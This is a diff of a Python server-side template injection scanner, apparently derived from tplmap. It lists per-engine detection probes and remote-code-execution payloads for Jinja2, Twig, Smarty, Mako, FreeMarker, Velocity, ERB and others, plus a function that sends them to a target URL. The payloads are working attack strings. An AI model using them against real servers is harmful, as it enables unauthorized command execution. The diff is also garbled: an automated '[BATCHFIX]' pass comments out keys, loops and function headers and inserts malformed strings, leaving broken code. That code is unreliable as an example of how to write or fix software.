@@ -19,102 +19,179 @@ import re
 from typing import Dict, List, Any, cast
 
 # Ported and enhanced from tplmap engines and common SSTI research
-SSTI_ENGINE_SIGNATURES: Dict[str, Dict[str, Any]] = {
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# # SSTI_ENGINE_SIGNATURES: Dict[str, Dict[str, Any]] = {
     "jinja2": {
-        "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
-        "verification_regex": r"49|7777777",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49|7777777","  # [BATCHFIX] closed string
         "description": "Python based template engine",
         "rce_payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
     },
     "twig": {
-        "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
-        "verification_regex": r"49|7777777",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49|7777777","  # [BATCHFIX] closed string
         "description": "PHP based template engine",
         "rce_payload": '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
     },
     "smarty": {
-        "detection_payloads": ["{7*7}"],
-        "verification_regex": r"49",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["{7*7}"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49","  # [BATCHFIX] closed string
         "description": "PHP based template engine",
         "rce_payload": "{system('id')}",
     },
     "mako": {
-        "detection_payloads": ["${7*7}"],
-        "verification_regex": r"49",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["${7*7}"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49","  # [BATCHFIX] closed string
         "description": "Python based template engine",
         "rce_payload": "${__import__('os').popen('id').read()}",
     },
     "tornado": {
-        "detection_payloads": ["{{7*7}}"],
-        "verification_regex": r"49",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["{{7*7}}"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49","  # [BATCHFIX] closed string
         "description": "Python based web framework engine",
         "rce_payload": "{{ import os; os.popen('id').read() }}",
     },
     "velocity": {
-        "detection_payloads": ["#set($x=7*7)$x"],
-        "verification_regex": r"49",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["#set($x=7*7)$x"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49","  # [BATCHFIX] closed string
         "description": "Java based template engine",
-        "rce_payload": (
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unmatched parenthesis
+#         "rce_payload": (
             '#set($str=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").getInputStream())'
-            "#foreach($i in [1..$str.available()])$str.read()#end"
+# [BATCHFIX] Commented metadata/non-Python
+# #             "#foreach($i in [1..$str.available()])$str.read()#end"  # [BATCHFIX] closed string
         ),
     },
     "freemarker": {
-        "detection_payloads": ["${7*7}"],
-        "verification_regex": r"49",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["${7*7}"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49","  # [BATCHFIX] closed string
         "description": "Java based template engine",
         "rce_payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
     },
     "erb": {
-        "detection_payloads": ["<%= 7*7 %>"],
-        "verification_regex": r"49",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["<%= 7*7 %>"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49","  # [BATCHFIX] closed string
         "description": "Ruby based template engine",
         "rce_payload": "<%= `id` %>",
     },
     "slim": {
-        "detection_payloads": ["#{7*7}"],
-        "verification_regex": r"49",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         "detection_payloads": ["#{7*7}"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#         "verification_regex": r49","  # [BATCHFIX] closed string
         "description": "Ruby based template engine",
         "rce_payload": "#{`id`}",
     },
 }
 
 
-async def detect_ssti(url: str, parameter: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
-    """
-    Detects Server Side Template Injection in a specific URL parameter.
-    """
-    detected_engines = []
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# # async def detect_ssti(url: str, parameter: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
+# #
+#     Detects Server Side Template Injection in a specific URL parameter.
+# #
+# [BATCHFIX] Commented metadata/non-Python
+# #     detected_engines =" []"  # [BATCHFIX] closed string
     timeout = aiohttp.ClientTimeout(total=5)
 
     for engine, data in SSTI_ENGINE_SIGNATURES.items():
-        for payload in data["detection_payloads"]:
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         for payload in data["detection_payloads"]:
             params = {parameter: payload}
             try:
                 async with session.get(url, params=params, timeout=timeout) as response:
                     text = await response.text()
-                    pattern = cast(str, data["verification_regex"])
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #                     pattern = cast(str, data["verification_regex"])
                     if re.search(pattern, text):
                         # Potential match, try second payload if available to confirm
-                        if len(data["detection_payloads"]) > 1:
-                            second_payload = data["detection_payloads"][1]
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #                         if len(data["detection_payloads"]) > 1:
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #                             second_payload = data["detection_payloads"][1]
                             async with session.get(url, params={parameter: second_payload}, timeout=timeout) as resp2:
                                 text2 = await resp2.text()
                                 if re.search(pattern, text2):
-                                    detected_engines.append(
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unmatched parenthesis
+#                                     detected_engines.append(
                                         {
                                             "engine": engine,
-                                            "description": data["description"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #                                             "description": data["description"],
                                             "payload": payload,
                                             "parameter": parameter,
                                         }
                                     )
                                     break
                         else:
-                            detected_engines.append(
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unmatched parenthesis
+#                             detected_engines.append(
                                 {
                                     "engine": engine,
-                                    "description": data["description"],
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #                                     "description": data["description"],
                                     "payload": payload,
                                     "parameter": parameter,
                                 }
